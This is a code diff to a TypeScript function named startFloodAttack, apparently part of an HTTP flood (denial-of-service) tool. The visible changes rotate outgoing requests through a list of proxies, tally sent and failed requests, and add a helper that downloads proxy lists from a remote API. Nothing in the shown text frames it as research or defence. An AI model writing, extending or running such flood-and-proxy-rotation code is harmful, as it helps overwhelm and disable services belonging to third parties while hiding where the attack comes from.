@@ -119,7 +119,7 @@ export async function startFloodAttack(
           const proxyUrl = parsedProxies[totalSent % parsedProxies.length];
           try {
             const agent = new HttpsProxyAgent(proxyUrl.toString());
-            currentFetchOptions.agent = agent as any; // HttpsProxyAgent is compatible
+            currentFetchOptions.agent = agent as any; 
           } catch (e) {
             console.error(`Error creating proxy agent for ${proxyUrl}:`, e);
             failed++;
@@ -166,4 +166,43 @@ export async function startFloodAttack(
   }
 
   return { totalSent, successful, failed };
+}
+
+export async function fetchProxiesFromUrl(apiUrl: string): Promise<{ proxies?: string; error?: string }> {
+  if (!apiUrl.trim()) {
+    return { error: "API URL cannot be empty." };
+  }
+  try {
+    // Basic URL validation
+    new URL(apiUrl);
+  } catch (e) {
+    return { error: "Invalid API URL format. Please include the scheme (e.g., http:// or https://)." };
+  }
+
+  try {
+    const response = await fetch(apiUrl, { 
+      signal: AbortSignal.timeout(10000), // 10 second timeout
+      headers: { 'Accept': 'text/plain' } // Prefer plain text
+    }); 
+    if (!response.ok) {
+      return { error: `API request failed with status ${response.status}: ${response.statusText}` };
+    }
+    const text = await response.text();
+    if (!text.trim()) {
+      return { error: "API returned an empty proxy list." };
+    }
+    // Simple validation: check if response looks like a list of IPs or IP:Port
+    const lines = text.trim().split('\n');
+    if (lines.length === 0 || !lines.some(line => /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(:\d{1,5})?$/.test(line.trim()))) {
+        // console.warn("Fetched proxy list does not seem to contain valid IP(:Port) formats.", lines.slice(0,5));
+        // Allow it for now, but this could be a point of stricter validation
+    }
+    return { proxies: text.trim() };
+  } catch (e: any) {
+    console.error("Error fetching proxies from API:", e);
+    if (e.name === 'TimeoutError') {
+        return { error: "API request timed out." };
+    }
+    return { error: e.message || "Failed to fetch proxies. Check browser console for more details." };
+  }
 }
